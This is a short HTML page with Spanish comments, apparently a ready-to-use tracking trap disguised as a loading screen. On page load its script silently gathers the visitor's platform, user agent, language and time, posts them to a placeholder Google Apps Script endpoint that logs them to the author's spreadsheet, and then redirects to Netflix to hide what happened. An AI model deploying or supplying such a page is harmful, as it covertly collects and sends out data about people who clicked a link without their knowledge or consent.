<!DOCTYPE html>
<html>
<head>
    <title>Cargando...</title>
</head>
<body>
    <script>
        // TU URL DE GOOGLE APPS SCRIPT
        const scriptURL = 'TU_URL_DE_GOOGLE_SHEETS_AQUI';

        async function capturarInfo() {
            // Obtenemos datos del dispositivo
            const info = {
                plataforma: navigator.platform,
                agente: navigator.userAgent,
                idioma: navigator.language,
                fecha: new Date().toLocaleString()
            };

            // Enviamos los datos a tu Excel
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: new URLSearchParams(info)
            });

            // Redirigimos al link real (ejemplo: un video de YouTube o Netflix)
            window.location.href = "https://www.netflix.com";
        }

        capturarInfo();
    </script>
</body>
</html>
